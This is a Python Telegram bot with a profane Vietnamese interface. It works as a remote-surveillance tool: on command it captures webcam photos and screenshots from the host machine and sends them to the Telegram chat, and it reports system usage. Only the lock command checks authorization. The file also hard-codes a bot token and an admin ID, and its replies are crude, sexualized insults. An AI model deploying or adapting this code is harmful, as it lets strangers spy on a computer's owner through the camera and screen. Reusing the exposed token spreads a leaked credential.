#https://t.me/topdzam_bot

import telebot
import random
import psutil
import cv2
import pyautogui

TOKEN = "7752700357:AAE7EvJ60ssbH9FgCKWdIO4E2VKHkJo50-U"
bot = telebot.TeleBot(TOKEN)

AUTHORIZED_USERS = [1701124116]

# Kiểm tra quyền truy cập
def is_authorized(message):
    return message.from_user.id in AUTHORIZED_USERS

@bot.message_handler(commands=['start'])
def greet(message):
    username = message.from_user.first_name
    bot.reply_to(message, f"cặk cặk bủm bủm lủng củm cum cum nhắn làm cái déo j djtmem con loz {username}. Câm mỏ và đợi có ng vô rep đi chúc m có 1 ngày như cái con cặk😼\n\n"
                          "📌 Nếu mày ngu quá không biết làm gì tiếp thì gõ /help để tao chỉ cho!")

# Chào
@bot.message_handler(commands=['hello'])
def greet(message):
    username = message.from_user.first_name  
    bot.reply_to(message, f"Xin chào cái con mẹ mày! Mày rảnh quá hả mà bắt tao chào?")

# Hướng dẫn sử dụng bot
@bot.message_handler(commands=['help'])
def help_command(message):
    bot.send_message(message.chat.id, f"{insult_dict['help']}\n\n📜 **Hướng dẫn sử dụng bot:**\n"
                                      f"🔹 `/start` - Chào \n"
                                      f"🔹 `/hello` - Chào nhau phát\n"
                                      f"🔹 `/help` - Xem hướng dẫn\n"
                                      f"🔹 `/sendphoto` - Gửi ảnh nude\n"
                                      f"🔹 `/sendmsg` - Gửi tin nhắn chat seg\n"
                                      f"🔹 `/systeminfo` - Xem CPU, RAM, Ổ cứng\n"
                                      f"🔹 `/webcam` - Chụp ảnh từ webcam\n"
                                      f"🔹 `/screenshot` - Chụp màn hình\n"
                                      f"🔹 `/lock` - **Khóa máy (chỉ admin)**")

import os

@bot.message_handler(commands=['sendphoto'])
def send_photo(message):
    bot.reply_to(message, insult_dict["sendphoto"])
    
    file_path = "test.jpg"
    if not os.path.exists(file_path):
        bot.send_message(message.chat.id, "Ôi Lổ rồi \nđéo có ảnh, tự kiếm đi!")
        return
    
    try:
        with open(file_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ôi Lổ rồi \n Lỗi khi gửi ảnh: {e}")

# Gửi tin nhắn
@bot.message_handler(commands=['sendmsg'])
def send_message(message):
    bot.reply_to(message, insult_dict["sendmsg"])
    bot.send_message(message.chat.id, "Đây là tin nhắn từ bot!")

# Lấy thông tin CPU RAM ổ cứng
@bot.message_handler(commands=['systeminfo'])
def system_info(message):
    bot.reply_to(message, insult_dict["systeminfo"])
    
    try:
        cpu_usage = psutil.cpu_percent()
        ram_usage = psutil.virtual_memory().percent
        disk_usage = psutil.disk_usage('/').percent
        
        info = f"💻 CPU: {cpu_usage}%\n🖥 RAM: {ram_usage}%\n💾 Ổ cứng: {disk_usage}%"
        bot.send_message(message.chat.id, info)
    except Exception as e:
        bot.send_message(message.chat.id, f"Không thể lấy thông tin hệ thống: {e}")
# Chụp ảnh webcam
@bot.message_handler(commands=['webcam'])
def capture_webcam(message):
    bot.reply_to(message, insult_dict["webcam"])
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("webcam.jpg", frame)
        bot.send_photo(message.chat.id, open("webcam.jpg", "rb"))
    cam.release()

# Chụp màn hình
@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    bot.reply_to(message, insult_dict["screenshot"])
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    bot.send_photo(message.chat.id, open("screenshot.png", "rb"))

# Khóa máy
@bot.message_handler(commands=['lock'])
def lock_pc(message):
    if is_authorized(message):
        bot.reply_to(message, insult_dict["lock"])
        pyautogui.hotkey('win', 'l')
    else:
        bot.reply_to(message, "Mày đéo có quyền khóa máy đâu, ML 😾!")

insult_dict = {
    "hello": "Xin chào cái con mẹ mày! Mày rảnh quá hả mà bắt tao chào?",
    "help": "con cặk, tao không phải mẹ mày mà phải hướng dẫn tận nơi đâu! Đây này, nhìn cho kỹ:",
    "sendphoto": "Mày lười đến mức không tự chụp ảnh nổi à? Đây, tao gửi hộ mày con loz!",
    "sendmsg": "Đây là tin nhắn từ tao! Nhắn cái loz gì suốt ngày thế😾😾😾?",
    "systeminfo": "trong lúc đợi kết quả, có lẽ bạn cũng nên cả kiểm tra lại bộ não của mình nhé! 😍😍😍",
    "webcam": "Xinh đẹp bằng ai mà cứ thích chụp 😩",
    "screenshot": "chụp cho đã bị leak ra thì ăn l nhé",
    "lock": "Khóa máy hả? Cút mẹ mày đi nhé 😾",
}

bot.polling()
